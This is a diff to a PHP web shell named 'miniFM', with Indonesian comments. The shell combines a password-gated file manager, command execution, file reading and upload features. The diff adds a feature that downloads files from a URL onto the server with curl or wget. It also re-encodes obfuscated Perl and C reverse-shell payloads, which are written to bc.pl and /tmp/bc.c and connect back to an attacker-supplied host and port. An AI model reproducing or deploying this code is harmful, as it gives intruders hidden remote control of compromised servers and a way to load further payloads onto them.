@@ -1,11 +1,11 @@
 <?php
+@error_reporting(0);
 @ini_set('display_errors','Off');
 @ini_set('ignore_repeated_errors',0);
 @ini_set('log_errors','Off');
 @ini_set('max_execution_time',0);
 @ini_set('memory_limit', '128M');
-@error_reporting(0);
-$stitle = ".:: [ miniFM ] ::."; /* jangan diganti kalo kamu ingin fitur backconnect tetap bekerja! */
+$stitle = "miniFM"; /* jangan diganti kalo kamu ingin fitur backconnect tetap bekerja! */
 $sfooter = "[ orang_dalam ]"; /* diganti gkpp, gk ngaruh! */
 $auth_pass = '$2y$10$u0LRXNXe3JeFZuQSrIrASu3Puc.wNLrtXWvRntANJ8h03Xfnnr4YK';
 $webprotocol = isset($_SERVER['HTTPS']) && ($_SERVER['HTTPS'] == 'on' || $_SERVER['HTTPS'] == 1) || isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https' ? "https://" : "http://";
@@ -122,14 +122,14 @@ function fType($a,$c=null){
 		case 'edit'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--cyan)" d="M471.6 21.7c-21.9-21.9-57.3-21.9-79.2 0L362.3 51.7l97.9 97.9 30.1-30.1c21.9-21.9 21.9-57.3 0-79.2L471.6 21.7zm-299.2 220c-6.1 6.1-10.8 13.6-13.5 21.9l-29.6 88.8c-2.9 8.6-.6 18.1 5.8 24.6s15.9 8.7 24.6 5.8l88.8-29.6c8.2-2.7 15.7-7.4 21.9-13.5L437.7 172.3 339.7 74.3 172.4 241.7zM96 64C43 64 0 107 0 160V416c0 53 43 96 96 96H352c53 0 96-43 96-96V320c0-17.7-14.3-32-32-32s-32 14.3-32 32v96c0 17.7-14.3 32-32 32H96c-17.7 0-32-14.3-32-32V160c0-17.7 14.3-32 32-32h96c17.7 0 32-14.3 32-32s-14.3-32-32-32H96z"/></svg>'; break;
 		case 'cmd'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M9.4 86.6C-3.1 74.1-3.1 53.9 9.4 41.4s32.8-12.5 45.3 0l192 192c12.5 12.5 12.5 32.8 0 45.3l-192 192c-12.5 12.5-32.8 12.5-45.3 0s-12.5-32.8 0-45.3L178.7 256 9.4 86.6zM256 416H544c17.7 0 32 14.3 32 32s-14.3 32-32 32H256c-17.7 0-32-14.3-32-32s14.3-32 32-32z"/></svg>'; break;
 		case 'bc'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 576 512" height="'.$c.'"><path fill="var(--bg-icon)" d="M80.3 44C69.8 69.9 64 98.2 64 128s5.8 58.1 16.3 84c6.6 16.4-1.3 35-17.7 41.7s-35-1.3-41.7-17.7C7.4 202.6 0 166.1 0 128S7.4 53.4 20.9 20C27.6 3.6 46.2-4.3 62.6 2.3S86.9 27.6 80.3 44zM555.1 20C568.6 53.4 576 89.9 576 128s-7.4 74.6-20.9 108c-6.6 16.4-25.3 24.3-41.7 17.7S489.1 228.4 495.7 212c10.5-25.9 16.3-54.2 16.3-84s-5.8-58.1-16.3-84C489.1 27.6 497 9 513.4 2.3s35 1.3 41.7 17.7zM352 128c0 23.7-12.9 44.4-32 55.4V480c0 17.7-14.3 32-32 32s-32-14.3-32-32V183.4c-19.1-11.1-32-31.7-32-55.4c0-35.3 28.7-64 64-64s64 28.7 64 64zM170.6 76.8C163.8 92.4 160 109.7 160 128s3.8 35.6 10.6 51.2c7.1 16.2-.3 35.1-16.5 42.1s-35.1-.3-42.1-16.5c-10.3-23.6-16-49.6-16-76.8s5.7-53.2 16-76.8c7.1-16.2 25.9-23.6 42.1-16.5s23.6 25.9 16.5 42.1zM464 51.2c10.3 23.6 16 49.6 16 76.8s-5.7 53.2-16 76.8c-7.1 16.2-25.9 23.6-42.1 16.5s-23.6-25.9-16.5-42.1c6.8-15.6 10.6-32.9 10.6-51.2s-3.8-35.6-10.6-51.2c-7.1-16.2 .3-35.1 16.5-42.1s35.1 .3 42.1 16.5z"/></svg>'; break;
-		case 'out'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--light)" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>'; break;
+		case 'out'	: $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" height="'.$c.'"><path fill="var(--cyan)" d="M377.9 105.9L500.7 228.7c7.2 7.2 11.3 17.1 11.3 27.3s-4.1 20.1-11.3 27.3L377.9 406.1c-6.4 6.4-15 9.9-24 9.9c-18.7 0-33.9-15.2-33.9-33.9l0-62.1-128 0c-17.7 0-32-14.3-32-32l0-64c0-17.7 14.3-32 32-32l128 0 0-62.1c0-18.7 15.2-33.9 33.9-33.9c9 0 17.6 3.6 24 9.9zM160 96L96 96c-17.7 0-32 14.3-32 32l0 256c0 17.7 14.3 32 32 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32l-64 0c-53 0-96-43-96-96L0 128C0 75 43 32 96 32l64 0c17.7 0 32 14.3 32 32s-14.3 32-32 32z"/></svg>'; break;
 		case 'loader': $b = '<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" height="'.$c.'" style="margin:auto; padding-right:.5em; background:transparent;"><style>.spinner{transform-origin:center;animation:spinners .75s infinite linear}@keyframes spinners{100%{transform:rotate(360deg)}}</style><path d="M12,1A11,11,0,1,0,23,12,11,11,0,0,0,12,1Zm0,19a8,8,0,1,1,8-8A8,8,0,0,1,12,20Z" opacity=".25"/><path fill="var(--cyan)" class="spinner" d="M10.72,19.9a8,8,0,0,1-6.5-9.79A7.77,7.77,0,0,1,10.4,4.16a8,8,0,0,1,9.49,6.52A1.54,1.54,0,0,0,21.38,12h.13a1.37,1.37,0,0,0,1.38-1.54,11,11,0,1,0-12.7,12.39A1.54,1.54,0,0,0,12,21.34h0A1.47,1.47,0,0,0,10.72,19.9Z"/></svg>'; break;
 	}
 	return $b;
 }
 function encode($value,$keys) {if(!$value){return false;}$key = sha1($keys);$strLen = strlen($value);$keyLen = strlen($key);$j = 0;$crypttext = ''; for ($i = 0; $i < $strLen; $i++) {$ordStr = ord(substr($value, $i, 1));if ($j == $keyLen) {$j = 0;}$ordKey = ord(substr($key, $j, 1));$j++;$crypttext .= strrev(base_convert(dechex($ordStr + $ordKey), 16, 36));}return $crypttext;}
 function decode($value,$keys) {if(!$value){return false;}$key = sha1($keys);$strLen = strlen($value);$keyLen = strlen($key);$j = 0;$decrypttext = '';for ($i = 0; $i < $strLen; $i += 2) {$ordStr = hexdec(base_convert(strrev(substr($value, $i, 2)), 36, 16));if ($j == $keyLen) {$j = 0;}$ordKey = ord(substr($key, $j, 1));$j++;$decrypttext .= chr($ordStr - $ordKey);}return $decrypttext;}
-function generate($_a1a,$_a2a){ return $_a1a == 'encode' ? encode($_a2a,$GLOBALS['stitle']) : decode($_a2a,$GLOBALS['stitle']);}
+function generate($_a1a,$_a2a){ return $_a1a == 'encode' ? encode($_a2a,preg_replace('/[^a-zA-Z]/','',$GLOBALS['stitle'])) : decode($_a2a,preg_replace('/[^a-zA-Z]/','',$GLOBALS['stitle']));}
 function procopen($cmd){
 	$descspek = array(
 		1 => array("pipe", "w"),
@@ -353,7 +353,46 @@ function pathberkas($a){
 }
 function filemanager($fm){
 	$lokasinya = urutberkas($fm);
-	$fmtable = "<div class='d-block'>".pathberkas($fm)."</div><div class='table-responsive'><table class='table table-sm w-100 mb-0'><thead class='bg-dark text-light'><tr><th class='text-left' style='min-width:150px;'>Name</th><th class='text-center' style='min-width:100px;'>Modified</th><th class='text-center' style='min-width:125px;'>User/Group</th><th class='text-center' style='min-width:100px;'>Perm</th><th class='text-center' style='min-width:90px;'>Options</th></tr></thead><tbody>";
+	$fmtable = "<div class='col-12'><div class='d-block'>".pathberkas($fm)."</div></div>";
+	$fmtable .= "<div class='col-sm-6 col-md-6 col-lg-4'>
+		<form method='post' action='?act=mkdir' class='mb-3' id='rqmkdir'>
+			<input type='hidden' name='xpath' value=''/>
+			<div class='input-group'>
+				<select class='custom-select border-success' name='xtype' style='max-width:110px;'>
+					<option value='dir' selected>New dir</option>
+					<option value='file'>New file</option>
+				</select>
+				<input type='text' name='xdir' class='form-control form-control-sm border-success' max-length='50'></input>
+				<div class='input-group-append'><button class='btn btn-outline-success' type='submit'>Go</button></div>
+			</div>
+		</form>
+	</div>
+	<div class='col-sm-6 col-md-6 col-lg-4'>
+		<div class='mb-3' id='uploadmethod' data-xpath=''>
+			<div class='input-group'>
+				<div class='input-group-prepend'>
+					<label class='input-group-text'>Upload</label>
+				</div>
+				<select class='custom-select border-success' id='xtype'>
+					<option hidden selected>files</option>
+					<option value='file'>from local storage</option>
+					<option value='url'>from url</option>
+				</select>
+			</div>
+		</div>
+	</div>
+	<div class='col-sm-12 col-md-12 col-lg-4'>
+		<form method='post' action='?act=readfile' class='mb-3' id='rqreadfile'>
+			<div class='input-group'>
+				<div class='input-group-prepend'>
+					<label class='input-group-text'>ReadFile</label>
+				</div>
+				<input type='text' name='xpath' class='form-control form-control-sm border-success'></input>
+				<div class='input-group-append'><button class='btn btn-outline-success' type='submit'>Go</button></div>
+			</div>
+		</form>
+	</div>";
+	$fmtable .= "<div class='col-12 mb-3'><div class='table-responsive'><table class='table table-sm w-100 mb-0'><thead class='bg-dark text-light'><tr><th class='text-left' style='min-width:150px;'>Name</th><th class='text-center' style='min-width:100px;'>Modified</th><th class='text-center' style='min-width:125px;'>User/Group</th><th class='text-center' style='min-width:100px;'>Perm</th><th class='text-center' style='min-width:90px;'>Options</th></tr></thead><tbody>";
 	if(count($lokasinya)>0){
 		foreach($lokasinya as $kl => $dir){
 			$owner = owner($dir['full_path']);
@@ -420,7 +459,7 @@ function filemanager($fm){
 	} else {
 		$fmtable .= "<tr><td class='text-center' colspan='5'>Direktori tidak berisi file apapun</td></tr>";
 	}
-	$fmtable .= "</tbody></table></div>";
+	$fmtable .= "</tbody></table></div></div>";
 	return $fmtable;
 }
 if(isset($_GET['act'])){
@@ -513,6 +552,43 @@ if(isset($_GET['act'])){
 			$outs = "File yang mw dibaca, gk ada!";
 		}
 		echo $outs;
+		die();
+	} else if($_GET['act'] == 'uploader'){
+		$xpath = $_POST['xpath'];
+		$xurl = $_POST['xurl'];
+		$xname = $_POST['xname'];
+		if(is_writable($xpath)){
+			if(empty($xurl) || !filter_var($xurl, FILTER_VALIDATE_URL)){$errs[] = "Url tidak valid!";}
+			if(empty($xname)){$errs[] = "Nama file tidak boleh kosong!";}
+			if(isset($errs)){
+				$outs[] = $errs;				
+			} else {
+				if(file_exists($xpath."/".$xname)){@unlink($xpath."/".$xname);}
+				if(AvFunc(array('file_put_contents', 'file_get_contents'))){
+					$upfiles = @file_put_contents($xpath."/".$xname, @file_get_contents($xurl));
+					if($upfiles){
+						$outs[] = file_exists($xpath."/".$xname) ? $xname." uploaded!" : $xname." failed!";
+					} else {
+						$outs[] = "handling url failed!";
+					}
+				} else if(AvFunc(array('curl_version', 'fopen', 'fclose'))){
+					$ch = curl_init($xurl);
+					$fp = @fopen($xpath."/".$xname, 'w');
+					curl_setopt($ch, CURLOPT_FILE, $fp);
+					curl_setopt($ch, CURLOPT_HEADER, 0);
+					curl_exec($ch);
+					curl_close($ch);
+					@fclose($fp);
+					$outs[] = file_exists($xpath."/".$xname) ? $xname." uploaded!" : $xname." failed!";
+				} else {
+					$sendreq = cmd('wget -c '.$xurl.' -O '.$xname, $xpath);
+					$outs[] = isset($sendreq['stdout']) && strlen($sendreq['stdout'])>2 ? $xname." uploaded!" : $xname." failed!";
+				}
+			}
+		} else {
+			$outs[] = "Gak bisa upload file di direktori ini!";
+		}
+		echo isset($outs) ? implode('<br/>', $outs) : 'Invalid file!';
 		die();
 	} else if($_GET['act'] == 'upload'){
 		@ini_set('output_buffering', 0);
@@ -655,11 +731,11 @@ if(isset($_GET['act'])){
 				}
 			} else if($_POST['btype'] == 2){
 				$bcfile = $_POST['xpath']."/bc.pl";
-				$cf = cf($bcfile, generate("decode", "i356o4z57485r3v4l384l3v544p54336u365u4z5g3q3h4s2i5u245n565q2y2f494q2r3r2y40614h3j3r4r5l5x3r4v3v4p395j406w385t3m5t3652526a4e484e405u3t4s475c4k4s404n3c4a4l5p40694z3r4r5p5i3n4n3g384w5l31654q5m4n5e3l4q4j5a4e4e3j4y4r434v4v4c373d424b3n3s4z455v4o4y364z5l5x3r4v3v4x384j406h3n4t3m4p3p5k575z3v4b374v4b3k4r5i5r3b3g424c3e3j4s4p416y2i3r415t5x335g4f4r3a5l3464474k3a4d3l415o504g3t2c4u4s3y5y4o494n3s4b4d4y2r2h53624g4z385150664t563u27484l38444t5h306u315n5u5c4g3j3q4t4t4q5b4p4l3h4v4a4q2j3l49555y4h4u344c4l4q344z3v3l3p4d305o3s543u4o3p56555o3c373r335s2x4w495p2j3u3x3b4r39335050694j3s4l4265474v3s4k355d3b484n4d3r5145555v5l3g4r3s4i5h4c456059463g4l3q3p4o4s4m5o5x2d315v5n5546423r4z395p334h3q4p305l32406q4y3c3o4a4t4g3l4o5b5b3n3u4n3n373z2l5k4j4d4647545s5g3r5z3v484v54346l3p5c3r5d3454616l3e4c4y2n4p3v526k5b3r3q4n3a3j3s315m4p5l3l3n4k4m5n3p534u3t364p3v4o365s3p5f325z5y4f3i4y2q495v374v565p2n3e3w3p2r3s3v4k4i4b4p3p59515r344r3m3r385s3o5h345q4y473r5d43624w3t2i445t215p435q3f3s3o37363c4z4m575q3t344x4t4p365u3f4k365q4x493u5p394345425s5a4s384h4v4u2t4w5j594y2v4947363n4g505g5i4o33634s4w364x4s48484w3u5r354t3p4n33584w5r3s4p2i385u23626k5q2q3k4x3p2n3c3352435r3k345y5v4a3t5r3p47494p3r5h3q4p355m3n46535x3e4c4y2"));
+				$cf = cf($bcfile, generate("decode", "cjNpMnEybjRyNGw0dTJqNWQ0ZTRuMnY1NjR6NWM0djFuMXE0MDZjNHAzdDNrNDc0czViNHM0ODM0M28xYzJiNGk1aTU1NHY1MzNwNWo0bDUwNjg0NDRtNG40aDRuMnQzOTNtM2IzNTV3MzU0eDNuMjkyeDQ5NmYybDVmNGE0azJyM2YzcTRyNHU1azR5MmEydDNuM3gzcjVjMngzNDM1MzIzbDJqNDM0YzQ3NHA0aTRuNGY0MzRxNTI0bDU0NG80MDRlNHY1bjJ0M2IzcjNmMzc1MTR4MjY0ejNhMmMyYjRpNWk1NTR2NWoybzN4NDg2bzNkNGM0NzRvMmQyZzN6NW00ZjRpNGQ0OTJ0MzkyMjRmNGYyeTM2MzYzczFoMms0ejVsNHM0bzRnNDk0NTRtNHg1dzVnNHg1aDRpNXU0dTVoNW00ODRpMm4ybjRhNHg1ajJoMnoyNDNuMTA2ZjQ5NGM0YTQxNm4yNDVwM2MzajNxNHUzczJoMno0YzN6M2YzejRuNHAzeDNhMjM1bzNuNHY0ODRxM3EzdTNjM2MzeTRvMjgyYzJ2NWo0dzVrNGw0aTJkMjk2ejRwM2E0ZTQ5NHgzZzJoM3I0eDVoNGk0MDNwM3EzYTI5NWc0cTNtMmY0NTN2MTY0aDRtNGg0YzRrNW80ZzJuM3k0ODN3NDkzdTNsMmQydDNuNGk1YTQ5NG00eTNlMjA1MTVuMzY0OTQ3NHgzbzNhM3Y1azR2NW40ZTRvM2wyYzJ5M200ZDJvMmc0dDFtMWY0djU2NHY1ZzJ0M3AzZDN1NHAzMTRlMmYyNjN2M3QzcjNnM3U0YjNvM2MyeTNkNHExejJoNHc1YTR1NXczdzNyM2EzcjNzM3YzMTRjMmEyMjN0M28zMDU3M2wzYTN0M3IzbzJnNHYxcjFqNHg1YjRtNHAyMjVxMzgzYjMzNTA1bDJsM2MyaTRqMjM1ejRnM2kzYjN3M2QybzJnNHQxbTFqNDQ2azQxNjU0ajRoMmsyNDQ5NHE1azRzMm40cDVlMnQyaTR1M2oyejJyMTMzaDVkNHM1bDRsNWwyMzU0NWgzZzNrM3AyMjN3MTMzNzRjNGY0eTU2NHgzbjN1MzkzbzM2NXYzeTM1M3UxcTFrNWk0bjRzNGs1aTJuM3EzcDRuNG4zejRqMmY0"));
 				if($cf){
 					if(which('perl')){
 						$out = cmd("perl {$bcfile} {$_POST['bhost']} {$_POST['bport']} &", $_POST['xpath']);
-						$outs = $out['stdout']."\n".cmd("".generate("decode", "l4z5n3e5o446h2y4d2p5p4k5i4o394j5m2u5s5")."", $_POST['xpath'])['stdout'];						
+						$outs = $out['stdout']."\n".cmd("".generate("decode", "w5s4b234t4r4f296c274i4k5h4p32494n2l4t5")."", $_POST['xpath'])['stdout'];						
 					} else {
 						$outs = 'reverse shell using perl: failed!';						
 					}
@@ -668,13 +744,13 @@ if(isset($_GET['act'])){
 				}
 			} else if($_POST['btype'] == 3){
 				$bcfile = "/tmp/bc.c";
-				$cf = cf($bcfile, generate("decode", "i364r5y5w364x4v2z3t4w3m5m3s4p344u3p4s526o3i484m2n4p3u5q5i5r3u2f4a4c3r3e49505i4y28474r536j374r3s4y384r4r564n403v5k3l544v4l3v2d4o485u23654b5b3q3c4s3b3u2f4j5o4p5n4z38505z5447513r464q4z2x493t5j41644l4m40614w3d4o4u4f3r516l57373d4b4d454d4v4k4j4c464r4p426g3n4p4e484v5b454t354v2w5d3q4z5y4f3e463a4s4b3l4w5j5e4m3c424d4m3y2n4y4s594i3n4k4k56474v3v49495p334f3s4p326t34406o524g3n3s475u2r516u4c3j3l4a4a4k4l3m4m5i494i3n4l4o5w375z3q47484z2u5j335u436f325z5y4f3e463a4s4b3l466i5r3t2q4b4q2d4o4753475a47475r5w58435e333i3r4h3q4u344j4z4m34515b4g3q3g4a4s4b3k4n5k5q2d4q4o3e4j3j4h5p5a4p47474t414g3o4x2d464u4t31644u5o3v5t365252694s394b4i5h4j56485q4f394n3n3c4y2n4y4s594i3n4k4k56464l4r4l3w5p3v544s543o5u3p42556o3j4j39485v315r5k5946323l3b3d4o49555z484y37515o564p5h4e484v5b454t366h3k5f325z5y4f3e463a4s4b3l4t5b5736323l3c3j3p48534x5e494n4n5j4p3s563k3t3t5x345i3n4d345o324y4w404u2j3s345f455m455n3o4c4v3q373o345o5a4r3t354c425o354e3m4i3q4q4x493p5c3n5d3l4m4w524e463i4u4f3x426j5d4u2h414r2m3i495q5y4l4i3n4n53674s4n3v2y394s3m5546443q51444q4r524h3e3a4u4d4q5n5v4e4j3l4a494o4a4i534p5w2z375c4q5i3s4r3u284w5x3p564n4d3662444y4y514w3n3e4i5d4q5w5w4o3o4s4n3n373y2n4y4s594i3n4k4k5g3n4e3d4i3u4d3r554u5l32634n5n5p5t3v2y2o4h5h455q5l57373i414r3d4m4s4m5o5x2d315u5k5g3n4e3d4i3p4c3m5f3s4l3s544q46556a4e463q4y4r434v4u47363c4l3c3p2l3m4m5i494i3n4l4o57485e3v4k3t414q5i3n4c336f325z5y4f3e463a4s4b3l4r5l5s363u4n3b3v3e4v4k4i4q4k345y5v4a3p5e3d4i3p4d3q56485c356f3p4a5r5o3c363s4u4s3y5y4o49463c4l37373t4k555v4q2z37534s5g3p563f46495z2165464e4n5g355r5p5n3t3k4l3m4d4k4n5u47373f4a4b3y2t49505l5f4z3n4q584b315p433"));
+				$cf = cf($bcfile, generate("decode", "cjNpNGg0NTRrNG80YjRtNWMyMDNqNHo1NTRxNWY0czI5NDczNjN0MXMzZjRqNDc0dDVyNGM0ZTRuMzIzajRyNDA2MTRrNHM1NTRyNWE0MDYyNGg0NTNyMXUxZTJnNHY1NzRjNGw0ajU2NHAzMDNrNDY0cDRxNWw0bTVxNHMyZDR2NXMyZzRiMzQzbzE5NGc0MTZtM2U0ZTViNHU1bDJwNXU1dDRiMjM0cTRhNGE0MTRjMjM0ODRnNWo0cDNpMjc0ajRjNDM2MjRlNW4yZDJ2NDYzczFnMmgybjNhMjk0ZzQxNm0zNzRoNTEzNTNyMW8zbzNoMmIybDRzNGw0czRrNW80ODJqNHU1NDRzNTE0YTQ1NG40ZzVnNHY1ZTJvNGQ0djU1M3gxdjFuM2EyODJhMmw1ZjU2NHE1aDR1NWwyNTQwNHgyazIxM3gxcDFmMnAzYzI4Mmo0bzVmNDM0ajRmNGY0NDRuNTg0dTVmNGg0dDRwMzczZzJlM3A0MTRkM2szcTQyNTAzMjNvMW8zZDJvM28zczRjNGc0dTJtNGc0djUzNGc0ZjR4NWw0cDMxM2UyOTRwNHc1bDQwNm0yNjRvNHc1ZjRvMmE0eDU5NG00eDM3NGI1aTJ1MzEzNTNyMW8zbzNoMmIybDRoNGg0dDIwNmQ0ZTR6M2c1NTRsNWk0czJrNDQ0aTViNGw1bzRkMjUzcDNmNG00ZTR6NTE0MTQ2NGw1dzVoMmU1azRuNXI0YjU1NDY0azIxM3gxcDFmMnAzYzI4MjY0ajU5Mmk0ODJwNGc0ODRzNWM0MTZtMmEzZTNnNWozcTNpMzM1bTI4MnAzMDVsNGczYzVwMzQ1cjNwNGw0cTNuMmEybDNuM3IzMzVuM28zajNlNXAzbzRrM24yOTI0MzYzdDFwM2UyZDJjMnE1YzRnMnAydjM1NGY0ZzR2NWo1NDR4NWkybTU5NDA0bzNwMm00bTRxNG80YTQxNmMyajRmNGk1YzRpNTQ0YTRqNGQyejNvMnAzazJvNGQ0djVxMmcyczRvNXM0NTRoNG41dTNrNHg1azQxNjg0MDZvM3M0aTQ1NGo0NDRiNGw1bTRoMmgydzMxMzU0aDJlMnM0dTEzM2YycDNlMmQyYzJwM2UyZzJwNGs1azRpNGg0ejV1M2IyazRoNHU1ajRsNWo1dDRiMjg0OTRjNGo0cjNsMnoycDExMzkycDM4MmUyOTJkMnAzZjJ6NWI0cDRwNHo1azRnMngyZTRyMW0xYTJwM20zOTI2NnIxMjNkMm8zbzNoMjc0bjRvNHQybjJuNTg0azI4MjM0aTJnNHAxczE5MmQycDNmMmw1cjRsNHUyeDNjNGM0dDJuM3IyaDIxMzYzMDM5MmwzYTJvMzk0MTZ3NXoyajI4NGM0bjJmMjc0bDJ6MnAxMTM5MnAzODJlMms0dTQwNnI0bTVqNGwyZTI0NDg0aDRuNDI0bDQ4NGEyMjRuNWIydTMxMzUzcjFvM28zaDJiMjU0azRpNHE0bTVrMjY0NDR3MzAzNjNtMXo0"));
 				if($cf){
 					if(which('gcc')){
-						$out = cmd("".generate("decode", "c4j5i5l3o2v5h2t2p4v5n42444j5f234k4r5w534a484n264")."", $_POST['xpath']);
+						$out = cmd("".generate("decode", "n5c464a2t2i4f244o4d4g42434k582t2l4i4x5u2j594r274")."", $_POST['xpath']);
 						@unlink("/tmp/bc.c");
 						$out = cmd("/tmp/bc {$_POST['bhost']} {$_POST['bport']} &", $_POST['xpath']);
-						$outs = cmd("".generate("decode", "l4z5n3e5o446h2y4d2p5p4k5i4o394j5")."", "/tmp/")['stdout'];
+						$outs = cmd("".generate("decode", "w5s4b234t4r4f296c274i4k5h4p32494")."", "/tmp/")['stdout'];
 					} else {
 						$outs = 'reverse shell using C: failed!';
 					}
@@ -864,95 +940,60 @@ if(!isset($_SESSION['auth'])){
 		<link rel="shortcut icon" href="<?php echo fType('logo');?>"/>
 		<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/4.6.2/css/bootstrap.min.css" integrity="sha512-rt/SrQ4UNIaGfDyEXZtNcyWvQeOq0QLygHluFQcSjaGB04IxWhal71tKuzP6K8eYXYB6vJV4pHkXcmFGGQ1/0w==" crossorigin="anonymous" referrerpolicy="no-referrer" />
 		<title><?php echo $stitle;?></title>
-		<style>@import url(https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap);:root{--cyan:#2be2ff;--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0,212,51;--bs-danger-rgb:220,53,69}::-webkit-scrollbar-track{border-radius:6px;background-color:#2b2f34}::-webkit-scrollbar{width:6px;height:4px}::-webkit-scrollbar-thumb{border-radius:6px;-webkit-box-shadow:inset 0 0 4px #000;background-color:var(--bg-icon)}body,html,pre{font-family:"Ubuntu Mono",monospace}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}body{font-size:1em;padding-top:5.25rem;color:#ddd}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input,select{font-size:1em!important}nav .nav-tabs{border-bottom:1px solid #2be2ff}nav .nav-tabs .nav-link.active{background:#00a6c0;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #2be2ff}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(var(--bs-success-rgb),5%)}table thead th{background:rgb(var(--bs-success-rgb),20%);border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:.3s}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.breadcrumb{background:linear-gradient(170deg,rgb(var(--bs-success-rgb),20%),transparent);padding:4px 10px}.breadcrumb-item a:hover{color:var(--bg-success)}.breadcrumb-item+.breadcrumb-item{padding-left:.2rem}.breadcrumb-item+.breadcrumb-item::before{padding-right:.2rem}pre,textarea.form-control{font-size:1em;border:0!important;color:#cfdce8!important}.form-control-sm{height:auto}.form-control:disabled,.form-control[readonly]{background:#272c31;color:#767676}.media.dir svg{margin:auto;padding-right:.5em}.media.file svg{margin:auto;padding:0 .7em 0 .25em}.fsmall{display:block;font-size:1.75vh;color:#61aa64}.bg-success-rgb,.input-group-prepend *{background:rgb(var(--bs-success-rgb),10%);border:1px solid rgb(var(--bs-success-rgb),50%);color:rgb(var(--bs-success-rgb),90%)}#hasilcommand *,input[type=text],input[type=text]:active,input[type=text]:focus{background:#343a40;color:#cfdce8}select{background-color:#343a40!important;color:#cfdce8!important}.custom-select{padding:5px 10px;color:#cfdce8;background:url("data:image/svg+xml,%3csvg xmlns='http://www.w3.org/2000/svg' width='4' height='5' viewBox='0 0 4 5'%3e%3cpath fill='%23149232' d='M2 0L0 2h4zm0 5L0 3h4z'/%3e%3c/svg%3e") right .75rem center/8px 10px no-repeat #343a40}.custom-file *{background:#343a40;color:#cfdce8;border:1px solid rgb(var(--bs-success-rgb),50%)}.custom-file-label::after{content:"multiple";color:var(--success);background:#2b2f34}#hasilcommand .card{border-radius:.25rem;border:1px solid rgb(var(--bs-success-rgb),50%)}#hasilcommand .card .card-body{border-radius:.25rem}.text-success{color:rgb(0,212,51,90%)!important}.text-cyan{color:var(--cyan)!important;color:#eee}@media screen and (max-width:420px){nav .nav-tabs .nav-link{padding:.5rem 1rem;letter-spacing:-.1em}.btn{padding:0 10px!important}}@media screen and (max-width:767px){body{padding-top:4rem}.container{max-width:100%!important}.blockquote,.btn,.input-group-text,body{font-size:.8em!important}.fsmall{font-size:1.5vh}.form-control-sm{font-size:initial;height:auto}.custom-select{font-size:inherit;height:auto!important}.custom-file,.custom-file-input,.custom-file-label{height:calc(1.5em + .75rem)!important}}</style>
+		<style>@import url(https://fonts.googleapis.com/css2?family=Ubuntu+Mono:ital,wght@0,400;0,700;1,400;1,700&display=swap);:root{--cyan:#2be2ff;--bg-icon:#149232;--bg-success:#00d433;--bs-success-rgb:0,212,51;--bs-danger-rgb:220,53,69}::-webkit-scrollbar-track{border-radius:6px;background-color:#2b2f34}::-webkit-scrollbar{width:6px;height:4px}::-webkit-scrollbar-thumb{border-radius:6px;-webkit-box-shadow:inset 0 0 4px #000;background-color:var(--bg-icon)}body,html,pre{font-family:"Ubuntu Mono",monospace}.modal .modal-body,body,html{background:#2b2f34}body button{color:#eee}body{font-size:1em;padding-top:4rem;color:#ddd}.row{margin-left:-10px;margin-right:-10px}.col,[class*=col-]{padding-right:10px;padding-left:10px}input,select{font-size:1em!important}nav .nav-tabs{border-bottom:1px solid #00a6c0}nav .nav-tabs .nav-link.active{background:#00a6c0;color:#fff}nav .nav-tabs .nav-link.active svg path{fill:#ffffff!important}nav .nav-tabs .nav-link.active,nav .nav-tabs .nav-link:focus,nav .nav-tabs .nav-link:hover{border:1px solid #2be2ff}table{border-radius:10px}table td,table th{border-top:1px solid #444c54!important}table tr:nth-child(odd){background:rgb(var(--bs-success-rgb),5%)}table thead th{background:rgb(var(--bs-success-rgb),20%);border-top:0 solid #eee!important;border-bottom:2px solid var(--bg-success)!important}table thead tr th:first-child{border-top-left-radius:.25rem}table thead tr th:last-child{border-top-right-radius:.25rem}.breadcrumb-item a,table tbody{color:#cfdce8}table tbody tr:hover td{color:#fff;transition:.3s}table tbody tr:hover{background:rgb(var(--bs-success-rgb),10%)}.breadcrumb{background:linear-gradient(170deg,rgb(var(--bs-success-rgb),20%),transparent);padding:4px 10px}.breadcrumb-item 